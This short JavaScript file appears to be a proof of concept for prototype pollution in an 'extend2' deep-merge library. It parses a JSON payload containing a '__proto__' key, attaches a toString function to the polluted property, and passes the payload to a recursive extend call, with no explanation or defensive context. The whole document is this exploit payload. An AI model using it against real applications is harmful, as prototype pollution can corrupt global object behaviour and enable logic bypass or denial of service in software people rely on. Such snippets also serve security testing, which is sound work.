const extend = require('./extend2@1.0.0');
const payload = JSON.parse('{"__proto__": {"polluted": {}}}')
payload.__proto__.polluted.toString = function() { return "yes"; }
extend(true, {}, payload);
